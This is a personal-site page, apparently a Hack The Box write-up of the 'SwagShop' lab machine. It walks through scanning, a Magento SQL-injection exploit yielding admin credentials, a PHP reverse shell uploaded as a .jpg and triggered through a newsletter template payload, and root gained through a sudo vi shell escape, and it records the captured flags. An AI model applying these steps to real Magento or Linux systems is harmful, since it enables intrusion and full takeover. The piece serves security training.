@@ -1,0 +1,295 @@
+<!--*INDEXED*-->
+<html>
+<head>
+    <!-- meta things -->
+    <meta name=viewport content="width=device-width, initial-scale=1">
+    <title>Note - Nathan Higley</title>
+    <link rel="canonical" href="https://nathanhigley.com" />
+    <!-- end meta things -->
+  
+    <!-- favicon code -->
+    <link rel="apple-touch-icon" sizes="180x180" href="../../images/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="../../images/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="../../images/favicon-16x16.png">
+    <link rel="manifest" href="../../images/site.webmanifest">
+    <link rel="shortcut icon" href="../../images/favicon.ico">
+    <meta name="msapplication-TileColor" content="#2b5797">
+    <meta name="msapplication-config" content="../../images/browserconfig.xml">
+    <meta name="theme-color" content="#ffffff">
+    <!-- end favicon code -->
+  
+    <!-- style sheets -->
+    <link rel="stylesheet" href="../../style-sheets/styles.css">
+    <link rel="stylesheet" href="../../style-sheets/bootstrap-grid.css">
+    <link rel="stylesheet" href="../../style-sheets/bootstrap-grid.min.css">
+    <link rel="stylesheet" href="../../style-sheets/bootstrap-reboot.css">
+    <link rel="stylesheet" href="../../style-sheets/bootstrap-reboot.min.css">
+    <link rel="stylesheet" href="../../style-sheets/fontawesome.css">
+    <link rel="stylesheet" href="../../style-sheets/fonts.css">
+    <!-- end style sheets -->
+    <link rel="stylesheet" href="css/boostnote.css">
+    <link rel="stylesheet" href="css/dracula.css">
+    <link rel="stylesheet" href="css/katex.min.css">
+    <link rel="stylesheet" href="css/codemirror.css">
+    <link rel="stylesheet" href="css/main.min.css">
+</head>
+<body class="note-body">
+
+    <!-- nav code -->
+    <nav>
+        <ul class="note-header"> 
+            <li class="nav"><a class="nav" href="../../index.html#home"><i class="fas fa-igloo"></i><span class="labels"> Home</span></a></li>
+            <li class="nav"><a class="nav" href="../../index.html#about"><i class="fas fa-info-circle"></i><span class="labels"> About</span></a></li>
+            <li class="nav"><a class="nav" href="../../index.html#work"><i class="fas fa-desktop"></i><span class="labels"> Work</span></a></li>
+            <li class="nav"><a class="nav" href="../../index.html#contact"><i class="fas fa-address-card"></i><span class="labels"> Contact</span></a></li>
+            <li class="nav"><a class="nav" href="../notes.html"><i class="fas fa-sticky-note"></i><span class="labels"> Notes</span></a></li>
+        </ul>
+    </nav>
+    <!-- end nav code -->
+    <div class="d-flex" >
+      <div class="container-fluid">
+        <div class="row">
+          <div class="col-lg-12 note-spacer"></div>
+          <div class="col-lg-12"><h1 id="SwagShop" data-line="0">SwagShop</h1><p data-line="2">Machine IP: 10.10.10.140</p>
+<h3 id="Enumeration" data-line="4">Enumeration</h3>
+<h4 id="Nmap-Scan" data-line="6">Nmap Scan</h4>
+<pre class="code CodeMirror cm-s-dracula" data-line="8">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span><span class="CodeMirror-linenumber">2</span><span class="CodeMirror-linenumber">3</span><span class="CodeMirror-linenumber">4</span><span class="CodeMirror-linenumber">5</span><span class="CodeMirror-linenumber">6</span><span class="CodeMirror-linenumber">7</span><span class="CodeMirror-linenumber">8</span><span class="CodeMirror-linenumber">9</span><span class="CodeMirror-linenumber">10</span><span class="CodeMirror-linenumber">11</span><span class="CodeMirror-linenumber">12</span><span class="CodeMirror-linenumber">13</span><span class="CodeMirror-linenumber">14</span><span class="CodeMirror-linenumber">15</span><span class="CodeMirror-linenumber">16</span><span class="CodeMirror-linenumber">17</span><span class="CodeMirror-linenumber">18</span><span class="CodeMirror-linenumber">19</span></span>
+        <code class="">nmap -T4 -p- 10.10.10.140
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-07 15:07 EDT
+Nmap scan report for 10.10.10.140
+Host is up (0.091s latency).
+Not shown: 65525 closed ports
+PORT      STATE    SERVICE
+22/tcp    open     ssh
+80/tcp    open     http
+1039/tcp  filtered sbl
+2525/tcp  filtered ms-v-worlds
+5232/tcp  filtered sgi-dgl
+26255/tcp filtered unknown
+47037/tcp filtered unknown
+48924/tcp filtered unknown
+51397/tcp filtered unknown
+62470/tcp filtered unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 888.99 seconds
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><pre class="code CodeMirror cm-s-dracula" data-line="29">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span><span class="CodeMirror-linenumber">2</span><span class="CodeMirror-linenumber">3</span><span class="CodeMirror-linenumber">4</span><span class="CodeMirror-linenumber">5</span><span class="CodeMirror-linenumber">6</span><span class="CodeMirror-linenumber">7</span><span class="CodeMirror-linenumber">8</span><span class="CodeMirror-linenumber">9</span><span class="CodeMirror-linenumber">10</span><span class="CodeMirror-linenumber">11</span><span class="CodeMirror-linenumber">12</span><span class="CodeMirror-linenumber">13</span><span class="CodeMirror-linenumber">14</span><span class="CodeMirror-linenumber">15</span><span class="CodeMirror-linenumber">16</span><span class="CodeMirror-linenumber">17</span><span class="CodeMirror-linenumber">18</span><span class="CodeMirror-linenumber">19</span><span class="CodeMirror-linenumber">20</span><span class="CodeMirror-linenumber">21</span><span class="CodeMirror-linenumber">22</span><span class="CodeMirror-linenumber">23</span><span class="CodeMirror-linenumber">24</span><span class="CodeMirror-linenumber">25</span><span class="CodeMirror-linenumber">26</span><span class="CodeMirror-linenumber">27</span><span class="CodeMirror-linenumber">28</span><span class="CodeMirror-linenumber">29</span><span class="CodeMirror-linenumber">30</span><span class="CodeMirror-linenumber">31</span><span class="CodeMirror-linenumber">32</span><span class="CodeMirror-linenumber">33</span><span class="CodeMirror-linenumber">34</span><span class="CodeMirror-linenumber">35</span><span class="CodeMirror-linenumber">36</span><span class="CodeMirror-linenumber">37</span><span class="CodeMirror-linenumber">38</span><span class="CodeMirror-linenumber">39</span><span class="CodeMirror-linenumber">40</span><span class="CodeMirror-linenumber">41</span><span class="CodeMirror-linenumber">42</span><span class="CodeMirror-linenumber">43</span><span class="CodeMirror-linenumber">44</span><span class="CodeMirror-linenumber">45</span><span class="CodeMirror-linenumber">46</span></span>
+        <code class="">nmap -T4 -A -p22,80,1039,2525,5232,26255,47037,48924,51397,62470 10.10.10.140 
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-07 15:23 EDT
+Nmap scan report for 10.10.10.140
+Host is up (0.049s latency).
+
+PORT      STATE  SERVICE     VERSION
+22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
+|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
+|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
+80/tcp    open   http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Home page
+1039/tcp  closed sbl
+2525/tcp  closed ms-v-worlds
+5232/tcp  closed sgi-dgl
+26255/tcp closed unknown
+47037/tcp closed unknown
+48924/tcp closed unknown
+51397/tcp closed unknown
+62470/tcp closed unknown
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=9/7%OT=22%CT=1039%CU=44622%PV=Y%DS=2%DC=T%G=Y%TM=5D740
+OS:3DA%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)O
+OS:PS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DS
+OS:T11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)E
+OS:CN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F
+OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5
+OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z
+OS:%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=
+OS:N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%
+OS:CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1039/tcp)
+HOP RTT      ADDRESS
+1   48.38 ms 10.10.14.1
+2   48.51 ms 10.10.10.140
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.57 seconds
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><h4 id="Dirb" data-line="79">Dirb</h4>
+<pre class="code CodeMirror cm-s-dracula" data-line="80">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span><span class="CodeMirror-linenumber">2</span><span class="CodeMirror-linenumber">3</span><span class="CodeMirror-linenumber">4</span><span class="CodeMirror-linenumber">5</span><span class="CodeMirror-linenumber">6</span><span class="CodeMirror-linenumber">7</span><span class="CodeMirror-linenumber">8</span><span class="CodeMirror-linenumber">9</span><span class="CodeMirror-linenumber">10</span><span class="CodeMirror-linenumber">11</span><span class="CodeMirror-linenumber">12</span><span class="CodeMirror-linenumber">13</span><span class="CodeMirror-linenumber">14</span><span class="CodeMirror-linenumber">15</span><span class="CodeMirror-linenumber">16</span><span class="CodeMirror-linenumber">17</span><span class="CodeMirror-linenumber">18</span><span class="CodeMirror-linenumber">19</span><span class="CodeMirror-linenumber">20</span><span class="CodeMirror-linenumber">21</span><span class="CodeMirror-linenumber">22</span><span class="CodeMirror-linenumber">23</span><span class="CodeMirror-linenumber">24</span><span class="CodeMirror-linenumber">25</span><span class="CodeMirror-linenumber">26</span><span class="CodeMirror-linenumber">27</span><span class="CodeMirror-linenumber">28</span><span class="CodeMirror-linenumber">29</span><span class="CodeMirror-linenumber">30</span><span class="CodeMirror-linenumber">31</span><span class="CodeMirror-linenumber">32</span><span class="CodeMirror-linenumber">33</span><span class="CodeMirror-linenumber">34</span><span class="CodeMirror-linenumber">35</span><span class="CodeMirror-linenumber">36</span><span class="CodeMirror-linenumber">37</span><span class="CodeMirror-linenumber">38</span><span class="CodeMirror-linenumber">39</span><span class="CodeMirror-linenumber">40</span><span class="CodeMirror-linenumber">41</span><span class="CodeMirror-linenumber">42</span><span class="CodeMirror-linenumber">43</span><span class="CodeMirror-linenumber">44</span><span class="CodeMirror-linenumber">45</span><span class="CodeMirror-linenumber">46</span><span class="CodeMirror-linenumber">47</span><span class="CodeMirror-linenumber">48</span><span class="CodeMirror-linenumber">49</span><span class="CodeMirror-linenumber">50</span><span class="CodeMirror-linenumber">51</span><span class="CodeMirror-linenumber">52</span><span class="CodeMirror-linenumber">53</span><span class="CodeMirror-linenumber">54</span><span class="CodeMirror-linenumber">55</span><span class="CodeMirror-linenumber">56</span><span class="CodeMirror-linenumber">57</span><span class="CodeMirror-linenumber">58</span><span class="CodeMirror-linenumber">59</span><span class="CodeMirror-linenumber">60</span><span class="CodeMirror-linenumber">61</span><span class="CodeMirror-linenumber">62</span><span class="CodeMirror-linenumber">63</span><span class="CodeMirror-linenumber">64</span><span class="CodeMirror-linenumber">65</span><span class="CodeMirror-linenumber">66</span><span class="CodeMirror-linenumber">67</span><span class="CodeMirror-linenumber">68</span><span class="CodeMirror-linenumber">69</span><span class="CodeMirror-linenumber">70</span><span class="CodeMirror-linenumber">71</span><span class="CodeMirror-linenumber">72</span><span class="CodeMirror-linenumber">73</span><span class="CodeMirror-linenumber">74</span><span class="CodeMirror-linenumber">75</span><span class="CodeMirror-linenumber">76</span><span class="CodeMirror-linenumber">77</span><span class="CodeMirror-linenumber">78</span><span class="CodeMirror-linenumber">79</span></span>
+        <code class="">dirb http://10.10.10.140
+
+---- Scanning URL: http://10.10.10.140/ ----
+==&gt; DIRECTORY: http://10.10.10.140/app/                                        
+==&gt; DIRECTORY: http://10.10.10.140/errors/                                     
++ http://10.10.10.140/favicon.ico (CODE:200|SIZE:1150)                         
+==&gt; DIRECTORY: http://10.10.10.140/includes/                                   
++ http://10.10.10.140/index.php (CODE:200|SIZE:16097)                          
+==&gt; DIRECTORY: http://10.10.10.140/js/                                         
+==&gt; DIRECTORY: http://10.10.10.140/lib/                                        
+==&gt; DIRECTORY: http://10.10.10.140/media/                                      
+==&gt; DIRECTORY: http://10.10.10.140/pkginfo/                                    
++ http://10.10.10.140/server-status (CODE:403|SIZE:300)                        
+==&gt; DIRECTORY: http://10.10.10.140/shell/                                      
+==&gt; DIRECTORY: http://10.10.10.140/skin/                                       
+==&gt; DIRECTORY: http://10.10.10.140/var/                                        
+                                                                               
+---- Entering directory: http://10.10.10.140/app/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://10.10.10.140/errors/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://10.10.10.140/includes/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://10.10.10.140/js/ ----
+==&gt; DIRECTORY: http://10.10.10.140/js/calendar/                                
+==&gt; DIRECTORY: http://10.10.10.140/js/flash/                                   
+==&gt; DIRECTORY: http://10.10.10.140/js/lib/                                     
+==&gt; DIRECTORY: http://10.10.10.140/js/tiny_mce/                                
+                                                                               
+---- Entering directory: http://10.10.10.140/lib/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://10.10.10.140/media/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://10.10.10.140/pkginfo/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://10.10.10.140/shell/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://10.10.10.140/skin/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://10.10.10.140/var/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://10.10.10.140/js/calendar/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://10.10.10.140/js/flash/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://10.10.10.140/js/lib/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://10.10.10.140/js/tiny_mce/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+-----------------
+END_TIME: Sat Sep  7 15:29:47 2019
+DOWNLOADED: 9224 - FOUND: 3
+
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><p data-line="162">Found in /var/package/Interface_Adminhtml_Default-1.9.0.0.xml that the Magento version is 1.9 which is vulnerable to SQL injection.</p>
+<p data-line="164">Found exploit code at <a href="https://www.exploit-db.com/exploits/37977">Magento eCommerce - Remote Code Execution - XML webapps Exploit</a>.</p>
+<p data-line="166">Code worked with some modifications, dropping us with admin credentials:</p>
+<pre class="code CodeMirror cm-s-dracula" data-line="167">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span><span class="CodeMirror-linenumber">2</span></span>
+        <code class="">user: groot
+pass: yeet
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><p data-line="172">Within the admin app for Magento, I was able to use the following attack named Froghopper:<br>
+<a href="https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper">Anatomy Of A Magento Attack: Froghopper</a></p>
+<p data-line="175">To execute the attack, I needed to upload a php file that would give me a shell, but to upload it, I had to make the file extension .jpg.  Then upload it as a new category image.<br>
+<a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell | pentestmonkey</a></p>
+<p data-line="178">Then using the “Newsletter” feature of magento, I used the following code, and then previewed it to execute the php script</p>
+<pre class="code CodeMirror cm-s-dracula" data-line="179">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span></span>
+        <code class="">{{block type='core/template' template='../../../../../../media/catalog/category/&lt;filename&gt;.jpg}}
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><h3 id="Got-User" data-line="183">Got User</h3>
+<p data-line="184">I got a shell from this and was able to read the user hash as user www-data.</p>
+<pre class="code CodeMirror cm-s-dracula" data-line="185">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span><span class="CodeMirror-linenumber">2</span><span class="CodeMirror-linenumber">3</span></span>
+        <code class="">cat /home/haris/user.txt
+
+a448877277e82f05e5ddf9f90aefbac8
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><p data-line="191">Now to see how I can do privilege escalation:</p>
+<pre class="code CodeMirror cm-s-dracula" data-line="192">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span><span class="CodeMirror-linenumber">2</span><span class="CodeMirror-linenumber">3</span><span class="CodeMirror-linenumber">4</span><span class="CodeMirror-linenumber">5</span><span class="CodeMirror-linenumber">6</span><span class="CodeMirror-linenumber">7</span><span class="CodeMirror-linenumber">8</span><span class="CodeMirror-linenumber">9</span></span>
+        <code class="">sudo -l
+
+Matching Defaults entries for www-data on swagshop:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on swagshop:
+    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
+sudo /usr/bin/vi /var/www/html/*
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><p data-line="204">Since I need to run vi in a tty and my reverse shell did not run, I had to get a proper tty via the following command:</p>
+<pre class="code CodeMirror cm-s-dracula" data-line="206">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span></span>
+        <code class="">/usr/bin/python3 -c "import pty;pty.spawn('/bin/sh');" 
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><p data-line="210">Now I can run vi as sudo:</p>
+<pre class="code CodeMirror cm-s-dracula" data-line="211">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span></span>
+        <code class="">sudo /usr/bin/vi /var/www/html/**
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><p data-line="215">This opens vi, and then entering the following in the vi command line gives me a root shell:</p>
+<pre class="code CodeMirror cm-s-dracula" data-line="216">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span></span>
+        <code class="">:sh
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><h3 id="Got-Root" data-line="220">Got Root</h3>
+<p data-line="222">And I am in fact root:</p>
+<pre class="code CodeMirror cm-s-dracula" data-line="223">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span><span class="CodeMirror-linenumber">2</span><span class="CodeMirror-linenumber">3</span></span>
+        <code class="">whoami
+
+root
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><p data-line="229">And now we can read the root hash:</p>
+<pre class="code CodeMirror cm-s-dracula" data-line="230">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span><span class="CodeMirror-linenumber">2</span><span class="CodeMirror-linenumber">3</span><span class="CodeMirror-linenumber">4</span><span class="CodeMirror-linenumber">5</span><span class="CodeMirror-linenumber">6</span><span class="CodeMirror-linenumber">7</span><span class="CodeMirror-linenumber">8</span><span class="CodeMirror-linenumber">9</span><span class="CodeMirror-linenumber">10</span><span class="CodeMirror-linenumber">11</span><span class="CodeMirror-linenumber">12</span></span>
+        <code class="">cat /root/root.txt
+
+c2b087d66e14a652a3b86a130ac56721
+
+   ___ ___
+ /| |/|\| |\
+/_| ´ |.` |_\           We are open! (Almost)
+  |   |.  |
+  |   |.  |         Join the beta HTB Swag Store!
+  |___|.__|       https://hackthebox.store/password
+
+                   PS: Use root flag as password!
+</code>
+<i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre></div></div></div></div>
+<!--footer code-->
+<footer>
+    <a class=footer-link target="_blank" rel="noopener noreferrer" href="https://github.com/nadehi18"><i class="fab fa-github"></i></a>
+    <a class=footer-link target="_blank" rel="noopener noreferrer" href="https://linkedin.com/in/nadehi18"><i class="fab fa-linkedin"></i></a>
+    <a class=footer-link target="_blank" rel="noopener noreferrer" href="https://twitter.com/nadehi18"><i class="fab fa-twitter"></i></a>
+</footer>
+<!-- end footer code-->
+</body>            </html>
